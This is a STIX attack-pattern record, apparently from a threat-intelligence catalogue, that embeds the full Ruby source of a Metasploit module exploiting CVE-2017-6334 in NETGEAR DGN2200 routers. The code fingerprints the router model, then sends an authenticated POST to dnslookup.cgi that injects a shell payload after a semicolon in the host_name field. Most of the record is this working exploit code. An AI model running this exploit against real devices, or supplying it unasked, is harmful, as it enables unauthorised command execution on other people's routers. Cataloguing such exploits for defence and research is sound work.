{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--120ac96d-c2fa-45ff-8157-4b2da82a4d6d",
    "created": "2024-08-14T17:03:20.873551Z",
    "modified": "2024-08-14T17:03:20.873555Z",
    "name": "\"Netgear DGN2200 dnslookup.cgi Command Injection\"",
    "description": " This module exploits a command injection vulnerablity in NETGEAR DGN2200v1/v2/v3/v4 routers by sending a specially crafted post request with valid login details.  'License'              => MSF_LICENSE 'Platform'             => 'unix'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/netgear_dnslookup_cmd_exec.rb",
            "external_id": "netgear_dnslookup_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-6334"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/http'\nrequire \"base64\"\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'                 => \"Netgear DGN2200 dnslookup.cgi Command Injection\",\n      'Description'          => %q{\n        This module exploits a command injection vulnerablity in NETGEAR\n        DGN2200v1/v2/v3/v4 routers by sending a specially crafted post request\n        with valid login details.\n      },\n      'License'              => MSF_LICENSE,\n      'Platform'             => 'unix',\n      'Author'               => [\n        'thecarterb',  # Metasploit Module\n        'SivertPL'     # Vuln discovery\n      ],\n      'DefaultTarget'        => 0,\n      'Privileged'           => true,\n      'Arch'                 => [ARCH_CMD],\n      'Targets'              => [\n        [ 'NETGEAR DDGN2200 Router', { } ]\n      ],\n      'References'           =>\n        [\n          [ 'EDB', '41459'],\n          [ 'CVE', '2017-6334']\n        ],\n      'DisclosureDate' => '2017-02-25',\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('USERNAME', [true, 'Username to authenticate with', '']),\n        OptString.new('PASSWORD', [true, 'Password to authenticate with', ''])\n      ])\n\n    register_advanced_options(\n    [\n      OptString.new('HOSTNAME', [true, '\"Hostname\" to look up (doesn\\'t really do anything important)', 'www.google.com'])\n    ])\n    end\n\n  # Requests the login page which tells us the hardware version\n  def check\n    res = send_request_cgi({'uri'=>'/'})\n    if res.nil?\n      fail_with(Failure::Unreachable, 'Connection timed out.')\n    end\n     # Checks for the `WWW-Authenticate` header in the response\n    if res.headers[\"WWW-Authenticate\"]\n      data = res.to_s\n      marker_one = \"Basic realm=\\\"NETGEAR \"\n      marker_two = \"\\\"\"\n      model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]\n      vprint_status(\"Router is a NETGEAR router (#{model})\")\n      model_numbers = ['DGN2200v1', 'DGN2200v2', 'DGN2200v3', 'DGN2200v4']\n      if model_numbers.include?(model)\n        print_good(\"Router may be vulnerable (NETGEAR #{model})\")\n        return CheckCode::Detected\n      else\n        return CheckCode::Safe\n      end\n    else\n      print_error('Router is not a NETGEAR router')\n      return CheckCode::Safe\n    end\n  end\n\n  def default_credential?\n    true\n  end\n\n  def exploit\n    check\n\n    # Convert datastores\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n    hostname = datastore['HOSTNAME']\n\n    vprint_status(\"Using encoder: #{payload.encoder} \")\n    print_status('Sending payload...')\n\n    vprint_status(\"Attempting to authenticate with: #{user}:#{pass} (b64 encoded for auth)\")\n\n    creds_combined = Base64.strict_encode64(\"#{user}:#{pass}\")\n    vprint_status(\"Encoded authentication: #{creds_combined}\")\n\n    res = send_request_cgi({\n      'uri'         => '/dnslookup.cgi',\n      'headers'     => {\n        'Authorization' => \"Basic #{creds_combined}\"\n      },\n      'vars_post'   => {\n        'lookup'    => 'Lookup',\n        'host_name' => hostname + '; ' + payload.encoded\n    }})\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-02-25"
}